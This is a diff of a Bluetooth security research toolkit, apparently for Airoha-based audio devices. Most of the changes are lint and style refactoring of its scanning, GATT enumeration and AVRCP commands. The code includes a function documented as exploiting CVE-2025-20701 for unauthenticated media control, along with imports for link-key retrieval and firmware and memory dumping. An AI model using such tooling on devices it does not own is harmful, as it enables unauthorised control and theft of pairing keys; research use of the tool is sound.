@@ -5,17 +5,19 @@ and CVE-2025-20702 vulnerabilities, as well as dumping firmware and memory
 from affected devices.
 """
 
-import sys
-import os
-import glob
-import struct
-import logging
-import asyncio
+# pylint: disable=too-many-lines,too-many-locals,too-many-branches,too-many-statements,too-many-return-statements,too-many-arguments,too-many-positional-arguments,too-many-nested-blocks,import-outside-toplevel,line-too-long,broad-exception-caught
+
 import argparse
+import asyncio
+import fcntl
+import glob
+import logging
+import os
+import struct
 import subprocess
+import sys
 import time
 import traceback
-import fcntl
 
 from dataclasses import dataclass
 from enum import Enum, auto
@@ -31,36 +33,6 @@ except ImportError:
 
 from hexdump import hexdump
 
-from librace.constants import RaceType
-from librace.fota import FOTAUpdater
-from librace.packets import (
-    GetLinkKeyResponse,
-    RaceHeader,
-    RacePacket,
-    GetLinkKey,
-    GetSDKInfo,
-    BuildVersion,
-    GetEDRAddress,
-    GetEDRAddressResponse,
-)
-from librace.transport import (
-    Transport,
-    GATTBumbleChecker,
-    GATTBleakTransport,
-    GATTBumbleTransport,
-    RFCOMMBumbleChecker,
-    RFCOMMTransport,
-    USBHIDTransport,
-)
-from librace.race import RACE
-from librace.dumper import (
-    RACEDumper,
-    RACEFlashDumper,
-    RACERAMDumper,
-)
-from librace.util import setup_logging
-from librace.parttable import parse_partition_table
-
 # Rich library for beautiful table formatting
 from rich.box import Box
 from rich.console import Console, Group
@@ -69,6 +41,32 @@ from rich.text import Text
 from rich.live import Live
 from rich.panel import Panel
 from rich.rule import Rule
+
+from librace.constants import RaceType
+from librace.fota import FOTAUpdater
+from librace.packets import (
+    BuildVersion,
+    GetEDRAddress,
+    GetEDRAddressResponse,
+    GetLinkKey,
+    GetLinkKeyResponse,
+    GetSDKInfo,
+    RaceHeader,
+    RacePacket,
+)
+from librace.transport import (
+    GATTBleakTransport,
+    GATTBumbleChecker,
+    GATTBumbleTransport,
+    RFCOMMBumbleChecker,
+    RFCOMMTransport,
+    Transport,
+    USBHIDTransport,
+)
+from librace.race import RACE
+from librace.dumper import RACEDumper, RACEFlashDumper, RACERAMDumper
+from librace.util import setup_logging
+from librace.parttable import parse_partition_table
 
 # Global console instance for rich output (force_terminal ensures colors work)
 _console = Console(force_terminal=True)
@@ -125,16 +123,15 @@ def get_rssi_style(rssi: int, stale: bool = False) -> str:
     """
     if stale:
         return "dim"
-    elif rssi >= -50:
+    if rssi >= -50:
         return "bold green"
-    elif rssi >= -60:
+    if rssi >= -60:
         return "bright_green"
-    elif rssi >= -70:
+    if rssi >= -70:
         return "yellow"
-    elif rssi >= -80:
+    if rssi >= -80:
         return "red"
-    else:
-        return "bright_black"
+    return "bright_black"
 
 
 def print_table(table: Table):
@@ -420,13 +417,12 @@ def _reset_hci_controller(hci_device: str = "hci0") -> bool:
             logging.debug("HCI controller %s reset successfully.", hci_device)
             time.sleep(0.5)
             return True
-        else:
-            logging.debug(
-                "HCI reset failed for %s: %s",
-                hci_device,
-                result.stderr.decode() if result.stderr else "unknown error",
-            )
-            return False
+        logging.debug(
+            "HCI reset failed for %s: %s",
+            hci_device,
+            result.stderr.decode() if result.stderr else "unknown error",
+        )
+        return False
     except (subprocess.TimeoutExpired, FileNotFoundError, PermissionError) as e:
         logging.debug("Could not reset HCI controller: %s", e)
         return False
@@ -966,16 +962,15 @@ def init_transport(args: argparse.Namespace) -> Transport:
         if args.target_address is None:
             raise ValueError("RFCOMM transport needs --target-address!")
         return RFCOMMTransport(args.controller, args.target_address, args.authenticate)
-    elif transport_type == "bleak":
+    if transport_type == "bleak":
         return GATTBleakTransport(args.target_address, args.le_names)
-    elif transport_type == "gatt":
+    if transport_type == "gatt":
         return GATTBumbleTransport(
             args.controller, args.target_address, args.le_names, args.authenticate
         )
-    elif transport_type == "usb":
+    if transport_type == "usb":
         return USBHIDTransport(args.device)
-    else:
-        raise ValueError(f"Unknown transport type: {args.transport}")
+    raise ValueError(f"Unknown transport type: {args.transport}")
 
 
 class VulnerabilityStatus(Enum):
@@ -1167,8 +1162,7 @@ def _display_and_select_ble_device(devices_dict: dict, rssi_dict: dict | None = 
 
     # Get user selection
     chosen = input(
-        "Which device is yours? Enter number [0-%d] or X: "
-        % (len(devices_with_rssi) - 1)
+        f"Which device is yours? Enter number [0-{len(devices_with_rssi) - 1}] or X: "
     ).strip()
 
     if chosen.lower() == "x":
@@ -1181,9 +1175,8 @@ def _display_and_select_ble_device(devices_dict: dict, rssi_dict: dict | None = 
             addr, name, rssi = devices_with_rssi[idx]
             logging.info("Selected: %s (%s)", name if name else addr, addr)
             return (addr, name)
-        else:
-            logging.error("Invalid selection. Number out of range.")
-            return False
+        logging.error("Invalid selection. Number out of range.")
+        return False
     except ValueError:
         logging.error("Invalid input. Please enter a number or X.")
         return False
@@ -2249,7 +2242,7 @@ async def command_ble_scan(args: argparse.Namespace):
 
     # Extended Manufacturer Company IDs (Bluetooth SIG Assigned Numbers)
     # Source: https://www.bluetooth.com/specifications/assigned-numbers/
-    COMPANIES = {
+    companies = {
         0x0003: "IBM",
         0x0004: "Toshiba",
         0x0006: "Microsoft",
@@ -2331,7 +2324,7 @@ async def command_ble_scan(args: argparse.Namespace):
     }
 
     # Apple Continuity Protocol message types
-    APPLE_CONTINUITY_TYPES = {
+    apple_continuity_types = {
         0x02: "iBeacon",
         0x03: "AirPrint",
         0x05: "AirDrop",
@@ -2350,7 +2343,7 @@ async def command_ble_scan(args: argparse.Namespace):
     }
 
     # Apple Nearby Info action codes (device state)
-    APPLE_NEARBY_ACTION_CODES = {
+    apple_nearby_action_codes = {
         0x00: "Unknown",
         0x01: "Reporting Disabled",
         0x03: "Idle",
@@ -2364,7 +2357,7 @@ async def command_ble_scan(args: argparse.Namespace):
     }
 
     # Apple Nearby Action types
-    APPLE_NEARBY_ACTION_TYPES = {
+    apple_nearby_action_types = {
         0x01: "Apple TV Setup",
         0x04: "Mobile Backup",
         0x05: "Watch Setup",
@@ -2389,7 +2382,7 @@ async def command_ble_scan(args: argparse.Namespace):
     }
 
     # Known tracker service UUIDs (16-bit)
-    TRACKER_SERVICES = {
+    tracker_services = {
         0xFEED: "Tile",
         0xFEEC: "Tile",
         0xFD84: "Tile",
@@ -2414,10 +2407,10 @@ async def command_ble_scan(args: argparse.Namespace):
             # Bumble may return tuple (company_id, data) or raw bytes
             if isinstance(mfr_data, tuple) and len(mfr_data) >= 1:
                 company_id = mfr_data[0]
-                return COMPANIES.get(company_id, f"0x{company_id:04X}")
-            elif isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
+                return companies.get(company_id, f"0x{company_id:04X}")
+            if isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
                 company_id = struct.unpack("<H", mfr_data[:2])[0]
-                return COMPANIES.get(company_id, f"0x{company_id:04X}")
+                return companies.get(company_id, f"0x{company_id:04X}")
         return ""
 
     def normalize_mfr_data(
@@ -2439,7 +2432,7 @@ async def command_ble_scan(args: argparse.Namespace):
             return mfr_data[0], mfr_data[1] if isinstance(
                 mfr_data[1], bytes
             ) else bytes()
-        elif isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
+        if isinstance(mfr_data, bytes) and len(mfr_data) >= 2:
             # Raw bytes format: company_id (2 bytes LE) + payload
             company_id = struct.unpack("<H", mfr_data[:2])[0]
             return company_id, mfr_data[2:]
@@ -2470,7 +2463,7 @@ async def command_ble_scan(args: argparse.Namespace):
         msg_type = payload[0]
         msg_len = payload[1]
 
-        result["type"] = APPLE_CONTINUITY_TYPES.get(
+        result["type"] = apple_continuity_types.get(
             msg_type, f"Unknown (0x{msg_type:02X})"
         )
         result["type_code"] = msg_type
@@ -2515,7 +2508,7 @@ async def command_ble_scan(args: argparse.Namespace):
                     status = msg_data[1] if len(msg_data) > 1 else 0
 
                     result["nearby_info"] = {
-                        "action": APPLE_NEARBY_ACTION_CODES.get(
+                        "action": apple_nearby_action_codes.get(
                             action_code, f"0x{action_code:02X}"
                         ),
                         "action_code": action_code,
@@ -2531,7 +2524,7 @@ async def command_ble_scan(args: argparse.Namespace):
                 if msg_len >= 2 and len(msg_data) >= 2:
                     action_type = msg_data[1] if len(msg_data) > 1 else 0
                     result["nearby_action"] = {
-                        "type": APPLE_NEARBY_ACTION_TYPES.get(
+                        "type": apple_nearby_action_types.get(
                             action_type, f"0x{action_type:02X}"
                         )
                     }
@@ -2609,10 +2602,10 @@ async def command_ble_scan(args: argparse.Namespace):
             service_uuids = None
 
         for uuid16 in _extract_16bit_service_uuids(service_uuids):
-            if uuid16 in TRACKER_SERVICES:
+            if uuid16 in tracker_services:
                 result["is_tracker"] = True
                 result["tracker_type"] = (
-                    result.get("tracker_type") or TRACKER_SERVICES[uuid16]
+                    result.get("tracker_type") or tracker_services[uuid16]
                 )
                 result["tracker_service"] = f"0x{uuid16:04X}"
 
@@ -2624,11 +2617,11 @@ async def command_ble_scan(args: argparse.Namespace):
 
         # Get manufacturer data
         mfr_data = data.get(AdvertisingData.MANUFACTURER_SPECIFIC_DATA)
-        company_id, payload = normalize_mfr_data(mfr_data)
+        company_id, _payload = normalize_mfr_data(mfr_data)
 
         if company_id is not None:
             details["company_id"] = f"0x{company_id:04X}"
-            details["company"] = COMPANIES.get(company_id, "Unknown")
+            details["company"] = companies.get(company_id, "Unknown")
 
             # Parse Apple Continuity
             if company_id == 0x004C:
@@ -2745,7 +2738,7 @@ async def command_ble_scan(args: argparse.Namespace):
                 info_str = f"{pkts}pk"
 
             # Get style based on RSSI and age
-            style = get_rssi_style(rssi, stale=(age > 30))
+            style = get_rssi_style(rssi, stale=age > 30)
 
             table.add_row(
                 str(idx),
@@ -2902,7 +2895,7 @@ async def command_ble_scan(args: argparse.Namespace):
         )
 
         # Appearance values for device type identification
-        APPEARANCES = {
+        appearances = {
             64: "Phone",
             128: "Computer",
             192: "Watch",
@@ -2996,7 +2989,7 @@ async def command_ble_scan(args: argparse.Namespace):
                                 )
                                 if value and len(value) >= 2:
                                     app_val = struct.unpack("<H", value[:2])[0]
-                                    info["appearance"] = APPEARANCES.get(
+                                    info["appearance"] = appearances.get(
                                         app_val, f"0x{app_val:04X}"
                                     )
                             elif (
@@ -3348,8 +3341,7 @@ async def command_ble_scan(args: argparse.Namespace):
                         f"  \033[1;36m  python race_toolkit.py -c usb:0 --target-address {selected_addr} ble-info\033[0m\n"
                     )
                     return selected_addr
-                else:
-                    print("\n  \033[1;31mInvalid selection.\033[0m\n")
+                print("\n  \033[1;31mInvalid selection.\033[0m\n")
             except ValueError:
                 print("\n  \033[1;31mInvalid input.\033[0m\n")
     except (EOFError, KeyboardInterrupt):
@@ -4477,7 +4469,7 @@ async def analyze_uuid_patterns(uuids: list) -> dict:
     }
 
     # Known vendor base patterns (last 96 bits / 24 hex chars)
-    KNOWN_BASES = {
+    known_bases = {
         "0000-1000-8000-00805f9b34fb": "Bluetooth SIG (Standard)",
         "ba5e-f4ee-5ca1-eb1e5e4b1ce0": "Nordic Semiconductor (Legacy)",
         "451a-8ffc-0000-10008000002a": "Qualcomm",
@@ -4528,7 +4520,7 @@ async def analyze_uuid_patterns(uuids: list) -> dict:
         analysis["common_base_count"] = len(analysis["base_patterns"][most_common_base])
 
         # Check against known vendor bases
-        for known_base, vendor in KNOWN_BASES.items():
+        for known_base, vendor in known_bases.items():
             if known_base in most_common_base or most_common_base in known_base:
                 analysis["likely_vendor"] = vendor
                 break
@@ -4569,7 +4561,7 @@ async def research_unknown_characteristics(
 
     # Search Nordic database for each UUID (rate limited)
     print("  \033[1;36m⟳ Searching Nordic Bluetooth Numbers Database...\033[0m")
-    for uuid, props, svc in unknown_chars[:10]:  # Limit to first 10
+    for uuid, _props, _svc in unknown_chars[:10]:  # Limit to first 10
         result = await search_nordic_database(uuid)
         if result:
             research["nordic_results"][uuid] = result
@@ -4577,7 +4569,7 @@ async def research_unknown_characteristics(
     # Search GitHub for first 3 unique base patterns (to avoid rate limits)
     print("  \033[1;36m⟳ Searching GitHub for UUID references...\033[0m")
     searched_bases = set()
-    for uuid, props, svc in unknown_chars:
+    for uuid, _props, _svc in unknown_chars:
         if len(searched_bases) >= 3:
             break
         base = uuid[-24:] if len(uuid) >= 24 else uuid
@@ -4592,7 +4584,7 @@ async def research_unknown_characteristics(
     # Search known BLE specifications and web for ALL UUIDs
     print("  \033[1;36m⟳ Searching known BLE specifications and web...\033[0m")
     search_count = 0
-    for uuid, props, svc in unknown_chars:
+    for uuid, _props, _svc in unknown_chars:
         uuid_lower = uuid.lower()
 
         # Skip if already found in Nordic or GitHub
@@ -4627,7 +4619,7 @@ def print_research_results(research: dict, unknown_chars: list, term_width: int)
         term_width: Terminal width for formatting
     """
 
-    def print_header(title):
+    def print_header(title: str) -> None:
         print(f"\n\033[1;36m{'─' * term_width}\033[0m")
         print(f"\033[1;36m  {title}\033[0m")
         print(f"\033[1;36m{'─' * term_width}\033[0m")
@@ -4787,7 +4779,7 @@ def print_research_results(research: dict, unknown_chars: list, term_width: int)
 
 
 def format_characteristic_value(
-    short_id: str, char_name: str, value: bytes, appearances: dict
+    short_id: str, _char_name: str, value: bytes, appearances: dict
 ) -> str:
     """Format a characteristic value based on its type for human-readable display."""
     if not value:
@@ -4990,11 +4982,10 @@ def format_characteristic_value(
         # Show as hex with length
         if len(value) <= 16:
             return f"[{len(value)} bytes] {value.hex()}"
-        else:
-            return f"[{len(value)} bytes] {value[:16].hex()}..."
+        return f"[{len(value)} bytes] {value[:16].hex()}..."
 
     except Exception as e:
-        logging.debug(f"Error formatting value: {e}")
+        logging.debug("Error formatting value: %s", e)
         return f"[{len(value)} bytes] {value.hex()[:32]}..."
 
 
@@ -5011,10 +5002,8 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     from bumble.transport import open_transport_or_link
     from bumble.hci import Address
     from bumble.gatt import (
-        GATT_GENERIC_ACCESS_SERVICE,
         GATT_DEVICE_NAME_CHARACTERISTIC,
         GATT_APPEARANCE_CHARACTERISTIC,
-        GATT_DEVICE_INFORMATION_SERVICE,
         GATT_MANUFACTURER_NAME_STRING_CHARACTERISTIC,
         GATT_MODEL_NUMBER_STRING_CHARACTERISTIC,
         GATT_SERIAL_NUMBER_STRING_CHARACTERISTIC,
@@ -5032,7 +5021,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     # Track if user requested cancellation
     cancelled = False
 
-    def handle_sigint(signum, frame):
+    def handle_sigint(_signum: int, _frame: object | None) -> None:
         nonlocal cancelled
         cancelled = True
         print("\n\n  \033[1;33m⚠ Interrupted by user (Ctrl+C)\033[0m")
@@ -5052,7 +5041,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     release_bluetooth_controller(controller)
 
     # Well-known service UUIDs for device type identification
-    SERVICE_TYPES = {
+    service_types = {
         "0000180f-0000-1000-8000-00805f9b34fb": ("Battery Service", "🔋"),
         "0000180a-0000-1000-8000-00805f9b34fb": ("Device Information", "ℹ️"),
         "00001800-0000-1000-8000-00805f9b34fb": ("Generic Access", "📱"),
@@ -5085,7 +5074,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     }
 
     # Well-known characteristic UUIDs with descriptions
-    CHARACTERISTIC_NAMES = {
+    characteristic_names = {
         # Generic Access (0x1800)
         "2a00": ("Device Name", "The user-friendly name of the device"),
         "2a01": ("Appearance", "Device appearance category (e.g., phone, watch)"),
@@ -5225,7 +5214,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     }
 
     # Vendor-specific 128-bit characteristic UUIDs (common ones from various manufacturers)
-    VENDOR_CHARACTERISTICS = {
+    vendor_characteristics = {
         # Nordic Semiconductor UART Service
         "6e400002-b5a3-f393-e0a9-e50e24dcca9e": (
             "Nordic UART RX",
@@ -5374,7 +5363,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
     }
 
     # Appearance values
-    APPEARANCES = {
+    appearances = {
         0: "Unknown",
         64: "Phone",
         128: "Computer",
@@ -5450,12 +5439,12 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
 
     term_width = shutil.get_terminal_size((80, 24)).columns
 
-    def print_header(text):
+    def print_header(text: str) -> None:
         print(f"\n\033[1;36m{'─' * term_width}\033[0m")
         print(f"\033[1;36m  {text}\033[0m")
         print(f"\033[1;36m{'─' * term_width}\033[0m")
 
-    def print_field(label, value, indent=2):
+    def print_field(label: str, value: object | None, indent: int = 2) -> None:
         if value:
             print(f"{' ' * indent}\033[1;33m{label}:\033[0m {value}")
 
@@ -5642,13 +5631,13 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
 
         for service in peer.services:
             service_uuid = str(service.uuid).lower()
-            service_name, service_icon = SERVICE_TYPES.get(
+            service_name, service_icon = service_types.get(
                 service_uuid, (f"Unknown ({service.uuid})", "❓")
             )
             services_found.append((service_uuid, service_name, service_icon, service))
 
             # Helper to check if UUID matches (handles both full and short format)
-            def uuid_matches(char_uuid, short_id):
+            def uuid_matches(char_uuid: str, short_id: str) -> bool:
                 """Check if characteristic UUID matches a short ID like '2a00'."""
                 full_uuid = f"0000{short_id}-0000-1000-8000-00805f9b34fb"
                 short_format = f"uuid-16:{short_id}"
@@ -5681,7 +5670,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                         if value and len(value) >= 2:
                             appearance = struct.unpack("<H", value[:2])[0]
                             device_info["appearance"] = appearance
-                            device_info["appearance_name"] = APPEARANCES.get(
+                            device_info["appearance_name"] = appearances.get(
                                 appearance, f"Unknown (0x{appearance:04X})"
                             )
 
@@ -5748,7 +5737,9 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                                 else:
                                     device_info["hardware"] = value.hex()
                             logging.debug(
-                                f"Read hardware revision: {value.hex()} -> '{device_info['hardware']}'"
+                                "Read hardware revision: %s -> %r",
+                                value.hex(),
+                                device_info["hardware"],
                             )
 
                     elif (
@@ -5756,12 +5747,13 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                         or uuid_matches(char_uuid_str, "2a28")
                     ):
                         logging.debug(
-                            f"Found software revision characteristic: {char.uuid}"
+                            "Found software revision characteristic: %s", char.uuid
                         )
                         try:
                             value = await peer.read_value(char)
                             logging.debug(
-                                f"Software revision raw value: {value.hex() if value else 'None'}"
+                                "Software revision raw value: %s",
+                                value.hex() if value else "None",
                             )
                             if value:
                                 # Try to decode as UTF-8 string first
@@ -5781,13 +5773,15 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                                     else:
                                         device_info["software"] = value.hex()
                                 logging.debug(
-                                    f"Read software revision: {value.hex()} -> '{device_info['software']}'"
+                                    "Read software revision: %s -> %r",
+                                    value.hex(),
+                                    device_info["software"],
                                 )
                             else:
                                 device_info["software"] = None
                         except Exception as read_err:
                             logging.debug(
-                                f"Failed to read software revision: {read_err}"
+                                "Failed to read software revision: %s", read_err
                             )
 
                     # Battery Level (0x2A19)
@@ -5803,7 +5797,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                             device_info["battery_state"] = value[0]
 
                 except Exception as e:
-                    logging.debug(f"Failed to read characteristic {char.uuid}: {e}")
+                    logging.debug("Failed to read characteristic %s: %s", char.uuid, e)
 
         # Determine device type from multiple signals
         device_types = []
@@ -6039,22 +6033,22 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                 ):
                     # Full 128-bit format: 0000XXXX-0000-1000-8000-00805f9b34fb
                     short_id = char_uuid[4:8]
-                    if short_id in CHARACTERISTIC_NAMES:
-                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
+                    if short_id in characteristic_names:
+                        char_name, char_desc = characteristic_names[short_id]
                     display_char_uuid = f"0x{short_id.upper()}"
                     is_standard_char = True
                 elif char_uuid.startswith("uuid-16:"):
                     # Bumble short format: uuid-16:XXXX
                     short_id = char_uuid.split(":")[1].lower()
-                    if short_id in CHARACTERISTIC_NAMES:
-                        char_name, char_desc = CHARACTERISTIC_NAMES[short_id]
+                    if short_id in characteristic_names:
+                        char_name, char_desc = characteristic_names[short_id]
                     display_char_uuid = f"0x{short_id.upper()}"
                     is_standard_char = True
                 else:
                     display_char_uuid = char_uuid
                     # Check vendor-specific characteristics
-                    if char_uuid in VENDOR_CHARACTERISTICS:
-                        char_name, char_vendor, char_desc = VENDOR_CHARACTERISTICS[
+                    if char_uuid in vendor_characteristics:
+                        char_name, char_vendor, char_desc = vendor_characteristics[
                             char_uuid
                         ]
 
@@ -6095,7 +6089,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                         if value:
                             # Format the value based on characteristic type
                             formatted_value = format_characteristic_value(
-                                short_id, char_name, value, APPEARANCES
+                                short_id, char_name, value, appearances
                             )
                             print(
                                 f"         \033[1;36m→ Value:\033[0m {formatted_value}"
@@ -6128,7 +6122,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                         elif "READ_NOT_PERMITTED" in err_str:
                             print("         \033[0;90m→ Read not permitted\033[0m")
                         else:
-                            logging.debug(f"Read failed for {char_uuid}: {e}")
+                            logging.debug("Read failed for %s: %s", char_uuid, e)
                             print(
                                 f"         \033[0;90m→ Read failed: {err_str[:50]}\033[0m"
                             )
@@ -6152,7 +6146,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                 )
                 print_research_results(research, unknown_characteristics, term_width)
             except Exception as e:
-                logging.debug(f"Research failed: {e}")
+                logging.debug("Research failed: %s", e)
                 print("  \033[0;33m⚠ Automated research failed (network issue?)\033[0m")
                 print("  \033[0;90mManual research URLs:\033[0m")
                 mac_parts = target_address.replace("/P", "").split(":")
@@ -6203,7 +6197,7 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
             "fd5a",
             "fd6",
         ]
-        for svc_uuid, svc_name, svc_icon, svc in services_found:
+        for svc_uuid, svc_name, _svc_icon, _svc in services_found:
             # Check short UUID format
             short_uuid = (
                 svc_uuid.split("-")[0].replace("0000", "")
@@ -6318,16 +6312,18 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
                 if level_str.endswith("%"):
                     try:
                         pct = int(level_str.rstrip("%"))
-                        bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
-                        print_field("Battery Level", f"{pct}% [{bar}]", indent=4)
-                    except:
+                        battery_bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
+                        print_field(
+                            "Battery Level", f"{pct}% [{battery_bar}]", indent=4
+                        )
+                    except Exception:  # pylint: disable=broad-exception-caught
                         print_field("Battery Level", level_str, indent=4)
                 else:
                     print_field("Battery Level", level_str, indent=4)
             elif device_info.get("battery") is not None:
                 pct = device_info["battery"]
-                bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
-                print_field("Battery Level", f"{pct}% [{bar}]", indent=4)
+                battery_bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
+                print_field("Battery Level", f"{pct}% [{battery_bar}]", indent=4)
 
             if device_info.get("battery_state") is not None:
                 state_val = device_info["battery_state"]
@@ -6575,8 +6571,6 @@ async def command_ble_info(args: argparse.Namespace):  # pyright: ignore[reportG
         print("\n  \033[1;33mOperation cancelled. Cleaning up...\033[0m")
     except Exception as e:
         logging.error("Enumeration failed: %s", e)
-        import traceback
-
         traceback.print_exc()
     finally:
         # Restore original signal handler
@@ -6689,7 +6683,6 @@ async def command_ble_speaker(args: argparse.Namespace):
     target_address = args.target_address
     action = getattr(args, "action", "probe")
     char_uuid = getattr(args, "char_uuid", None)
-    write_data = getattr(args, "write_data", None)
     timeout = getattr(args, "timeout", 10.0)
 
     if not target_address:
@@ -6822,7 +6815,7 @@ async def command_ble_speaker(args: argparse.Namespace):
             f"  Found {len(all_chars)} characteristics ({len(writable_chars)} writable, {len(readable_chars)} readable)\n"
         )
 
-        def print_header(title):
+        def print_header(title: str) -> None:
             print(f"\n\033[1;36m{'─' * term_width}\033[0m")
             print(f"\033[1;36m  {title}\033[0m")
             print(f"\033[1;36m{'─' * term_width}\033[0m")
@@ -7142,8 +7135,6 @@ async def command_ble_speaker(args: argparse.Namespace):
         print(f"\n  \033[0;31m✗ Connection timed out after {timeout}s\033[0m\n")
     except Exception as e:
         logging.error("Speaker control failed: %s", e)
-        import traceback
-
         traceback.print_exc()
     finally:
         try:
@@ -7164,9 +7155,6 @@ async def command_avrcp(args: argparse.Namespace):
     This exploits CVE-2025-20701 - devices that allow BR/EDR connections
     without proper authentication, enabling unauthorized media control.
     """
-    from bumble.device import Device, DeviceConfiguration
-    from bumble.transport import open_transport_or_link
-    from bumble.hci import Address
     from bumble.core import BT_BR_EDR_TRANSPORT
     from bumble import avrcp, avc
 
@@ -7186,7 +7174,7 @@ async def command_avrcp(args: argparse.Namespace):
     term_width = min(os.get_terminal_size().columns, 100)
 
     # Map actions to AVRCP operation IDs
-    AVRCP_OPERATIONS = {
+    avrcp_operations = {
         "play": avc.PassThroughFrame.OperationId.PLAY,
         "pause": avc.PassThroughFrame.OperationId.PAUSE,
         "stop": avc.PassThroughFrame.OperationId.STOP,
@@ -7250,22 +7238,21 @@ async def command_avrcp(args: argparse.Namespace):
                     print(f"    Retrying in {retry_delay}s...")
                     await asyncio.sleep(retry_delay)
                     continue
-                else:
-                    print(
-                        "\n  \033[1;31m✗ Device not responding to Classic Bluetooth\033[0m"
-                    )
-                    print("\n  Possible causes:")
-                    print("    • Device is connected to another phone/computer")
-                    print("    • Device is in BLE-only mode")
-                    print("    • Device is out of range or powered off")
-                    print("\n  Try:")
-                    print("    • Disconnect the device from your phone first")
-                    print("    • Put device in pairing mode")
-                    print("    • Move closer to the device")
-                    await checker.close()
-                    return
+                print(
+                    "\n  \033[1;31m✗ Device not responding to Classic Bluetooth\033[0m"
+                )
+                print("\n  Possible causes:")
+                print("    • Device is connected to another phone/computer")
+                print("    • Device is in BLE-only mode")
+                print("    • Device is out of range or powered off")
+                print("\n  Try:")
+                print("    • Disconnect the device from your phone first")
+                print("    • Put device in pairing mode")
+                print("    • Move closer to the device")
+                await checker.close()
+                return
 
-            elif "limited_resources" in error_str:
+            if "limited_resources" in error_str:
                 print("  \033[0;33m⚠ Controller busy, resetting...\033[0m")
                 await checker.close()
                 release_bluetooth_controller(controller)
@@ -7274,10 +7261,9 @@ async def command_avrcp(args: argparse.Namespace):
                 await checker.setup()
                 continue
 
-            else:
-                print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
-                await checker.close()
-                return
+            print(f"\n  \033[1;31mConnection failed: {e}\033[0m")
+            await checker.close()
+            return
 
     if not connected:
         await checker.close()
@@ -7297,40 +7283,50 @@ async def command_avrcp(args: argparse.Namespace):
 
         # Create a minimal delegate
         class MinimalDelegate(avrcp.Delegate):
-            def __init__(self):
+            """Minimal AVRCP delegate for unauthenticated control."""
+            # pylint: disable=missing-function-docstring
+
+            def __init__(self) -> None:
+                super().__init__()
                 self.volume = 0x7F
 
             async def get_supported_player_application_setting_attributes(self):
                 return []
 
             async def get_player_application_setting_attribute_text(
-                self, attribute_ids
+                self, _attribute_ids: list[int]
             ):
                 return []
 
-            async def get_player_application_setting_values(self, attribute_ids):
+            async def get_player_application_setting_values(
+                self, _attribute_ids: list[int]
+            ):
                 return []
 
             async def get_player_application_setting_value_text(
-                self, attribute_id, value_ids
+                self, _attribute_id: int, _value_ids: list[int]
             ):
                 return []
 
-            async def set_player_application_setting_values(self, settings):
+            async def set_player_application_setting_values(
+                self, _settings: dict[int, int]
+            ) -> None:
                 pass
 
-            async def get_element_attributes(self, identifier, attribute_ids):
+            async def get_element_attributes(
+                self, _identifier: int, _attribute_ids: list[int]
+            ):
                 return []
 
-            async def inform_battery_status_of_ct(self, battery_status):
+            async def inform_battery_status_of_ct(self, _battery_status: int) -> int:
                 # AVRCP StatusCode.OPERATION_COMPLETED
                 return 0x04
 
-            async def set_absolute_volume(self, volume):
+            async def set_absolute_volume(self, volume: int) -> int:
                 self.volume = volume
                 return volume
 
-            async def get_now_playing_items(self, *args):
+            async def get_now_playing_items(self, *_args: object):
                 return 0, []
 
         delegate = MinimalDelegate()
@@ -7372,7 +7368,7 @@ async def command_avrcp(args: argparse.Namespace):
                             timeout=timeout,
                         )
                         if checker.connection is None:
-                            raise RuntimeError("No connection established")
+                            raise RuntimeError("No connection established") from None
                         connection = checker.connection
                         print("    \033[1;32m✓ Reconnected!\033[0m")
                     except Exception as reconn_err:
@@ -7474,7 +7470,7 @@ async def command_avrcp(args: argparse.Namespace):
 
         else:
             # Send media control command
-            operation = AVRCP_OPERATIONS.get(action)
+            operation = avrcp_operations.get(action)
             if not operation:
                 print(f"\n  \033[0;31m✗ Unknown action: {action}\033[0m")
                 return
@@ -7507,8 +7503,6 @@ async def command_avrcp(args: argparse.Namespace):
 
     except Exception as e:
         logging.error("AVRCP control failed: %s", e)
-        import traceback
-
         traceback.print_exc()
     finally:
         await checker.close()
@@ -7664,7 +7658,7 @@ async def command_enumerate_classic(args: argparse.Namespace):
 
     channels = await find_rfcomm_channels(connection)
 
-    def format_uuid(uuid_obj) -> str:
+    def format_uuid(uuid_obj: object) -> str:
         """Format a UUID object to a readable string with name if known."""
         if isinstance(uuid_obj, BumbleUUID):
             # Get the string representation and name
@@ -7674,7 +7668,7 @@ async def command_enumerate_classic(args: argparse.Namespace):
             return uuid_str
         return str(uuid_obj)
 
-    def format_uuids(uuids) -> str:
+    def format_uuids(uuids: list[object] | object) -> str:
         """Format a list of UUIDs to a readable string."""
         if isinstance(uuids, list):
             return ", ".join(format_uuid(u) for u in uuids)
@@ -7688,7 +7682,9 @@ async def command_enumerate_classic(args: argparse.Namespace):
             logging.info("  Channel %2d: %s", channel, uuid_str)
 
             # Check if it's a known RACE UUID
